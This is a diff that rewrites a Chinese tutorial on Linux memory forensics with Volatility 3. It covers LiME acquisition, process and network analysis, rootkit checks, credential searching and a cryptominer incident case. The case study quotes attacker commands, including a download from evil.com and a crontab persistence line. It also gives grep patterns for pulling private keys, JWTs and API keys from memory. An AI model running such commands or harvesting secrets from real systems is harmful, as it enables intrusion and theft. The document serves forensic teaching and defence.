@@ -1,165 +1,299 @@
-# 内存取证实战：Volatility 3 从入门到精通
+# Linux 内存取证实战：Volatility 3 从入门到精通
 
 ---
 
-## 一、为什么需要内存取证
+## 📋 目录
+
+1. [内存取证价值](#一为什么内存取证)
+2. [内存镜像采集](#二镜像采集)
+3. [Volatility 3 核心插件](#三volatility核心)
+4. [恶意代码检测](#四恶意代码检测)
+5. [凭据提取](#五凭据提取)
+6. [Rootkit 检测](#六rootkit检测)
+7. [完整分析案例](#七完整案例)
+
+---
+
+## 一、为什么内存取证
 
 ```
-磁盘取证 vs 内存取证：
-  磁盘：文件残留、删除恢复、时间戳分析
-  内存：运行中的进程、网络连接、加密密钥、注入代码、Rootkit
+磁盘 vs 内存:
 
-关键数据在内存中：
-  ✓ 正在运行的恶意进程（可能无文件落地）
-  ✓ 网络连接（C2通信信息）
-  ✓ 注入的恶意代码（进程镂空/反射DLL）
-  ✓ 注册表缓存（持久化痕迹）
-  ✓ 用户凭据（LSASS内存中的Hash/Kerberos票据）
-  ✓ 加密容器密码/密钥
-  ✓ Rootkit隐藏的内容（磁盘上看不到）
+磁盘证据: 文件、日志、时间戳 (静态)
+内存证据: 运行中的进程、网络连接、加密密钥、
+          注入代码、Rootkit、用户凭据 (动态)
+
+关键证据只在内存:
+  ✓ 恶意代码可能只在内存中运行(无文件落地)
+  ✓ C2 通信信息(IP/端口/加密密钥)
+  ✓ 进程注入的恶意代码
+  ✓ 用户凭据(密码哈希/Kerberos票据)
+  ✓ 加密容器的解密密钥
+  ✓ Rootkit 隐藏的进程/文件/网络
 ```
 
 ---
 
-## 二、内存镜像采集
+## 二、镜像采集
 
-### 2.1 Windows 采集
-
-```bash
-# WinPMEM (Rekall项目) — 推荐
-winpmem.exe -o memory.raw        # 原始格式
-winpmem.exe -o memory.aff4       # AFF4格式（含元数据）
-
-# DumpIt (Magnet Forensics)
-DumpIt.exe  # 一键导出
-
-# FTK Imager
-# GUI工具，支持内存+磁盘同时采集
-
-# 注意：
-# ⚠️ 采集时可能触动恶意软件检测
-# ⚠️ 采集工具本身占用内存 → 可能覆盖证据
-# ⚠️ 优先通过网络采集（如Velociraptor远程采集）
-```
-
-### 2.2 Linux 采集
+### 2.1 Linux 采集
 
 ```bash
-# LiME (Linux Memory Extractor) — ★强烈推荐
-# 编译内核模块
-git clone https://github.com/504ensicsLabs/LiME.git
-cd LiME/src && make
+# LiME (Linux Memory Extractor) — 推荐
 
-# 加载模块采集
+# 安装编译
+git clone https://github.com/504ensicsLabs/LiME
+cd LiME/src
+make
+
+# 本地保存
 insmod lime.ko "path=/tmp/memory.lime format=lime"
 
-# 或通过TCP发送到取证服务器
+# TCP发送到取证服务器(不落地, 更安全)
 insmod lime.ko "path=tcp:192.168.1.100:4444 format=lime"
 
-# /dev/mem (旧版Linux)
-dd if=/dev/mem of=memory.raw bs=1M
-# ⚠️ /dev/mem在较新内核已限制访问范围
+# 取证服务器监听:
+nc -lvp 4444 > memory.lime
 
-# /proc/kcore (ELF格式内核内存)
-dd if=/proc/kcore of=kcore.dump bs=1M
+# 注意: 
+# ✦ 采集工具本身会占用内存 → 可能覆盖少量证据
+# ✦ 优先远程采集(不写入本地磁盘)
+# ✦ 采集后立即记录SHA256哈希
+sha256sum memory.lime > memory.lime.sha256
 ```
 
----
-
-## 三、Volatility 3 核心插件
+### 2.2 Volatility 3 安装
 
 ```bash
-# 安装
 pip install volatility3
 
-# Volatility 3 vs Volatility 2:
-# v3: Python 3, 插件式架构, 自动识别OS, 无需profile
-# v2: Python 2, profile方式, 被v3取代
-
-# ====== 基础信息 ======
-vol -f memory.raw windows.info          # OS版本/时间
-vol -f memory.raw windows.pslist        # 进程列表
-vol -f memory.raw windows.psscan        # 深度扫描（含隐藏进程）
-vol -f memory.raw windows.pstree        # 进程树
-
-# ====== 恶意代码检测 ======
-vol -f memory.raw windows.malfind       # 恶意代码检测(VAD标记异常)
-vol -f memory.raw windows.vadinfo       # VAD区域分析
-vol -f memory.raw windows.ldrmodules    # DLL加载验证(检测DLL Hollowing)
-
-# ====== 网络分析 ======
-vol -f memory.raw windows.netscan       # 网络连接+监听端口
-vol -f memory.raw windows.netstat       # 网络连接(旧版)
-
-# ====== 凭据提取 ======
-vol -f memory.raw windows.hashdump      # NTLM Hash(从SAM/缓存)
-vol -f memory.raw windows.lsadump       # LSA Secrets
-vol -f memory.raw windows.kerberos      # Kerberos票据
-
-# ====== 文件与注册表 ======
-vol -f memory.raw windows.filescan      # 文件对象扫描
-vol -f memory.raw windows.dumpfiles     # 提取文件
-vol -f memory.raw windows.registry.hivelist  # 注册表Hive列表
-vol -f memory.raw windows.registry.printkey --key "Software\Microsoft\Windows\CurrentVersion\Run"
-
-# ====== 命令行历史 ======
-vol -f memory.raw windows.cmdline       # 进程命令行
-vol -f memory.raw windows.consoles      # 控制台历史
-
-# ====== 进程Dump ======
-vol -f memory.raw windows.dumpfiles --pid 1234  # Dump进程内存
-vol -f memory.raw windows.memmap --pid 1234 --dump  # Dump完整进程
+# Volatility 3 vs 2:
+# v3: Python 3 + 自动识别OS + 插件式架构
+# v2: Python 2 + 需要指定profile (已被v3取代)
 ```
 
 ---
 
-## 四、典型场景
+## 三、Volatility 核心
 
-### 场景1：检测无文件恶意软件
+### 3.1 基础分析流程
 
 ```bash
-# 1. 扫描异常进程
-vol -f memory.raw windows.psscan
-# 对比 pslist（看是否有隐藏进程）
+# ===== Step 1: 确定 OS 版本 =====
+vol -f memory.lime linux.info
+# 输出: Linux 5.13.0-xxx (Ubuntu 20.04)
+# 确定是 Linux → 使用 linux.* 插件
 
-# 2. 可疑进程深度分析
-vol -f memory.raw windows.malfind --pid 5678
-# 查找PAGE_EXECUTE_READWRITE权限的内存区域(正常程序不应当有)
+# ===== Step 2: 进程分析 =====
+# 进程列表
+vol -f memory.lime linux.pslist
+vol -f memory.lime linux.pstree    # 进程树(更好看父子关系)
+vol -f memory.lime linux.psaux     # 含命令行参数
 
-# 3. 查看可疑进程注入的DLL
-vol -f memory.raw windows.dlllist --pid 5678
-# 查找路径异常的DLL(无签名/在Temp目录)
+# 可疑进程特征:
+# - 名称异常: [kworker] / random_string
+# - 路径异常: /tmp/xxx /dev/shm/xxx
+# - 父进程异常: java → /bin/bash (WebShell)
+# - CPU超高: >80% (挖矿)
 
-# 4. 提取注入代码
-vol -f memory.raw windows.vadinfo --pid 5678 --dump
-vol -f memory.raw windows.memmap --pid 5678 --dump
-# 提取后 → strings | VirusTotal
+# ===== Step 3: 网络连接 =====
+vol -f memory.lime linux.sockstat  # 所有socket
+vol -f memory.lime linux.netscan   # 更全面的网络扫描
+
+# 找外网连接(排除内网):
+vol -f memory.lime linux.netscan | 
+  grep -v "127.0.0.1\|10\.\|192.168\.\|172.16"
+
+# ===== Step 4: 文件系统 =====
+vol -f memory.lime linux.lsof      # 打开的文件
+vol -f memory.lime linux.filescan  # 所有文件对象
+
+# ===== Step 5: 命令行历史 =====
+vol -f memory.lime linux.bash      # Bash历史
+# → 可能找到攻击者执行的命令!
 ```
 
-### 场景2：分析C2通信
+### 3.2 进程 Dump
 
 ```bash
-# 1. 查看所有网络连接
-vol -f memory.raw windows.netscan
+# 导出整个进程内存
+vol -f memory.lime linux.proc_dump --pid 1234 --dump-dir ./dumps/
 
-# 2. 找异常连接
-#  • 非标准端口(非80/443/53)
-#  • 连接到非业务相关国家IP
-#  • 短周期心跳(每60秒连接一次)
-
-# 3. 将可疑进程dump出来
-vol -f memory.raw windows.memmap --pid <可疑PID> --dump
-# 用strings/IDA分析提取C2域名/IP/加密密钥
+# 分析dump:
+strings pid.1234.elf | grep -E "password|secret|token|api_key|BEGIN"
+strings pid.1234.elf | grep -E "http|https|\.com|\.net" | sort -u
 ```
 
 ---
 
-## 五、Checklist
+## 四、恶意代码检测
 
-- [ ] 内存采集工具就绪（WinPMEM/LiME）
-- [ ] 采集时使用写保护器（磁盘取证时）
-- [ ] 优先通过网络采集（减少对目标系统影响）
-- [ ] Volatility 3 安装+插件熟悉
-- [ ] 标准分析流程：进程→网络→DLL→凭据→注册表
-- [ ] 内存镜像哈希记录（SHA256）
-- [ ] 分析结果入证物链
+### 4.1 检测隐藏进程
+
+```bash
+# 方法1: 对比 pslist 和 直接搜索
+ps_count=$(vol -f memory.lime linux.pslist 2>/dev/null | wc -l)
+
+# 方法2: 遍历 /proc 模拟
+# /proc 中应该有对应的目录，Volatility 可检测隐藏
+
+# 方法3: 通过 task_struct 链表
+vol -f memory.lime linux.check_idt   # 检查IDT表(可能的Rootkit)
+vol -f memory.lime linux.check_syscall  # 检查系统调用表
+```
+
+### 4.2 注入代码检测
+
+```bash
+# 检测: 匿名可执行内存 (RWX 权限)
+vol -f memory.lime linux.malfind
+
+# 特征: 
+# - VMA 权限为 RWX (可读可写可执行)
+# - 通常只有 JIT 编译器会申请 RWX 内存
+# - 如果普通进程有大量 RWX 页 → 可疑!
+```
+
+### 4.3 内核模块检测
+
+```bash
+# 查看已加载的内核模块
+vol -f memory.lime linux.lsmod
+
+# 检查: 是否有隐藏的内核模块?
+# 对比 lsmod 列表和 /proc/modules
+# 差异 = 可能的 Rootkit 模块
+
+# 检查内核模块是否被篡改
+vol -f memory.lime linux.check_modules
+```
+
+---
+
+## 五、凭据提取
+
+### 5.1 用户凭据
+
+```bash
+# 从内存提取字符串 → 搜索凭据
+vol -f memory.lime linux.proc_dump --pid 1 --dump-dir ./dumps/
+# 在某些进程内存中可能找到:
+strings ./dumps/* | grep -iE "password|passwd|secret"
+
+# SSH 密钥
+strings ./dumps/* | grep -E "BEGIN.*PRIVATE KEY"
+
+# 环境变量(可能含密钥)
+vol -f memory.lime linux.envars --pid <可疑进程PID>
+```
+
+### 5.2 加密密钥
+
+```bash
+# 搜索 AES 密钥特征(256位 = 32字节高熵)
+strings memory.lime | grep -E "^[A-Za-z0-9+/=]{44}$" | sort -u
+
+# 搜索证书私钥
+strings memory.lime | grep -E "BEGIN (RSA|EC) PRIVATE KEY"
+
+# 搜索 JWT Token
+strings memory.lime | grep -E "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"
+
+# 搜索 API Key
+strings memory.lime | grep -E "sk-[A-Za-z0-9]{32,}"
+```
+
+---
+
+## 六、Rootkit 检测
+
+### 6.1 系统调用表检测
+
+```bash
+# 检测被 Hook 的系统调用
+vol -f memory.lime linux.check_syscall
+
+# 正常: 系统调用地址在 vmlinux 范围内
+# 异常: 地址在未知模块范围 → Hooked!
+```
+
+### 6.2 IDT 表检测
+
+```bash
+# 检测中断描述符表
+vol -f memory.lime linux.check_idt
+
+# 检测: IDT 条目地址是否异常
+```
+
+---
+
+## 七、完整案例
+
+```
+场景: 某企业 Linux 服务器 CPU 100%
+
+Phase 1: 发现
+  top → 进程 [kworker] 占用 800% CPU (8核)
+  kill -9 → 进程消失但3分钟后重生
+  → 有守护进程在维护!
+
+Phase 2: 采集
+  insmod lime.ko "path=tcp:192.168.1.100:4444 format=lime"
+  → 传输到取证服务器
+
+Phase 3: Volatility 分析
+
+  ① 进程分析
+    vol -f memory.lime linux.psaux | grep -v "^$"
+    → 发现:
+      PID 9876: /tmp/.cache/kworker (100% CPU)
+      PID 9877: /tmp/.cache/syslogd (管理进程)
+
+  ② 网络连接
+    vol -f memory.lime linux.netscan
+    → 进程 9876 连接:
+      TCP: 45.xxx.xxx.xxx:4444 (矿池!)
+      TCP: 51.xxx.xxx.xxx:3333 (备用矿池)
+
+  ③ 持久化检查
+    vol -f memory.lime linux.bash
+    → 历史命令:
+      echo "*/5 * * * * /tmp/.cache/syslogd" >> /etc/crontab
+      curl http://evil.com/miner.tar.gz | tar xz
+      ./xmrig -o pool.supportxmr.com:3333
+
+  ④ 提取样本
+    vol -f memory.lime linux.proc_dump --pid 9876 --dump-dir ./malware/
+    → 上传到 VirusTotal → 确认为 XMRig 挖矿
+
+Phase 4: 溯源入口
+  vol -f memory.lime linux.bash
+  → grep "Accepted" /var/log/auth.log
+  → root 从 1.2.3.4 登录(弱口令 root/123456)
+
+Phase 5: 清除
+  rm -rf /tmp/.cache/
+  crontab -r
+  passwd root → 强密码
+  PermitRootLogin no
+
+结论: 从内存镜像获得的证据包括:
+  ✓ 恶意进程 PID/命令行/网络连接
+  ✓ 攻击者执行的命令(bash历史)
+  ✓ 持久化机制(crontab)
+  ✓ 入侵入口(SSH弱口令)
+```
+
+---
+
+## ✅ 内存取证 Checklist
+
+- [ ] 采集内存镜像(LiME)
+- [ ] 记录SHA256哈希
+- [ ] Volatility 基础分析(ID→进程→网络→文件)
+- [ ] 检测隐藏进程/注入代码
+- [ ] 凭据搜索
+- [ ] Rootkit检测
+- [ ] 导出恶意进程(样本分析)
+- [ ] 构建时间线+入口溯源
